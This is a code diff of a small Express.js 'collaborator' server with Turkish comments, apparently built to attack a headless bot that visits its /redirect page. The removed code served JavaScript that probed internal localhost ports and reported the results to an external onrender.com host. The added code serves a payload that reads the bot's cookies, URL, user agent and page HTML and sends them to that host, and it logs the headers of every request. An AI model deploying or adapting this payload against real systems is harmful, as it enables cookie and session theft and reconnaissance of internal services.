@@ -5,31 +5,25 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 app.get('/redirect', (req, res) => {
-    console.log("\n--- BOT Yakalandı! Genişletilmiş İç Servis Taraması Başlatılıyor ---");
+    console.log("\n--- BOT YAKALANDI (Header & Data Exfil) ---");
+    console.log("Gelen IP:", req.ip);
+    console.log("Gelen Header'lar:", req.headers);
     
     const htmlPayload = `
     <html>
       <body>
-        <h2>Scanning internal services...</h2>
+        <h2>Loading...</h2>
         <script>
-          // Genişletilmiş iç port listesi (Web, Veritabanı, Önbellek, Admin servisleri)
-          const internalPorts = [
-            80, 443, 3000, 5000, 6379, 8080, 8443, 8888, 9000, 11211, 27017
-          ];
-          
-          internalPorts.forEach(port => {
-            const targetUrl = "http://127.0.0.1:" + port + "/";
-            
-            fetch(targetUrl, { mode: 'no-cors' })
-              .then(response => {
-                // Eğer hata fırlatmazsa veya yanıt dönerse bildir
-                fetch('https://collab-67oj.onrender.com/exfiltrate?status=success&port=' + port);
-              })
-              .catch(error => {
-                // Hata türünü ayırt etmek için hata mesajını gönderiyoruz
-                fetch('https://collab-67oj.onrender.com/exfiltrate?status=error&port=' + port + '&err=' + encodeURIComponent(error.toString()));
-              });
-          });
+          // Botun kendi ortamındaki bilgileri (URL, Cookie, LocalStorage vb.) sızdırmayı deniyoruz
+          const botInfo = {
+            cookie: document.cookie,
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+            innerHtml: document.body.innerHTML
+          };
+
+          // Bilgileri kendi sunucumuza exfiltrate ediyoruz
+          fetch('https://collab-67oj.onrender.com/exfiltrate?data=' + encodeURIComponent(JSON.stringify(botInfo)));
         </script>
       </body>
     </html>
@@ -40,12 +34,16 @@ app.get('/redirect', (req, res) => {
 });
 
 app.get('/exfiltrate', (req, res) => {
-    console.log("Servis Tarama Sonucu:", req.query);
+    console.log("\n🔥 --- BİLGİ SIZDIRMA RAPORU --- 🔥");
+    console.log("Query Verileri:", req.query);
     return res.status(200).send("OK");
 });
 
 app.use((req, res) => {
+    console.log("\n--- DİĞER İSTEK YAKALANDI ---");
+    console.log("Path:", req.path);
+    console.log("Header'lar:", req.headers);
     return res.status(200).send("OK");
 });
 
-app.listen(3000, () => console.log("Collaborator 3000 portunda hazır!"));
+app.listen(3000, () => console.log("Genişletilmiş Log Sunucusu 3000 portunda aktif!"));
